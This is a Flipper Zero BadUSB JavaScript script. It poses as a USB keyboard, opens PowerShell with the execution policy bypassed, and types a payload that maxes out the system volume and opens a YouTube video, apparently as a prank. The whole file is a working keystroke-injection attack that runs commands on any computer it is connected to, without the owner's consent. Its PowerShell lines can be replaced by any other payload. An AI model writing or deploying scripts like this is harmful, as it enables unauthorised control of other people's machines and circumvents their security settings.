// Script
let script = [
    "Function Set-Volume {Param([Parameter(Mandatory=$true)][ValidateRange(0,100)][Int]$volume)",
    "$keyPresses = [Math]::Ceiling( $volume / 2 )",
    "$obj = New-Object -ComObject WScript.Shell",
    "1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }",
    "for( $i = 0; $i -lt $keyPresses; $i++ ){$obj.SendKeys( [char] 175 )}}",
    "Set-Volume -volume 100",
    "Start-Process \'https://www.youtube.com/watch?v=2qBlE2-WL60\'",
    "exit",
];

// Requirements
let badusb = require("badusb");

// VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfrName: "Flipper", prodName: "Zero", layoutPath: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");

// Keep Connected
while (!badusb.isConnected()) {
    delay(1000);
}

// Open powershell
print("Opening powershell");
badusb.press("GUI", "r");
delay(600);
badusb.println("powershell -NoProfile -ExecutionPolicy Bypass");
delay(600);

// Run payload
print("Running payload");
for (let i = 0; i < script.length; i++) {
    badusb.println(script[i]);
    delay(200);
}

// Stop Script
badusb.quit();
print("Done");